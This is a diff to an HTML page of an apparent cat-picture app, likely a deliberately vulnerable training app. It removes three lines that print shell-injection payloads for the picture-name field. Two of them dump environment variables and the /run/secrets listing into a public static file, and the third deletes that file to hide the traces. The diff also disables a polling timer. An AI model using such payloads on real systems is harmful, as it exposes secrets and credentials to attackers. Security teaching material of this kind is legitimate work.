@@ -40,10 +40,6 @@
                 </header>
 
             </section>
-
-            <p><b>Don't paste the following into the picture name! <span style="color:red;">whatever.png" & echo "$(printenv)" > ./src/app/static/cats/yr_owned.txt & echo "</span> </b></p>
-            <p><b>Don't paste the following into the picture name! <span style="color:red;">whatever.png" & echo "$(ls /run/secrets)" > ./src/app/static/cats/yr_owned.txt & echo "</span> </b></p>
-            <p><b>And not this to cover your tracks! <span style="color:red;">whatever.png" & rm ./src/app/static/cats/yr_owned.txt & echo "</span> </b></p>
         </article>
     </body>
 
@@ -66,9 +62,11 @@
 
         get_cats();
 
+        /*
+        // unnecessary and annoying
         setInterval(function() {
             get_cats()
         }, 4000);
-
+        */
     </script>
 </html>
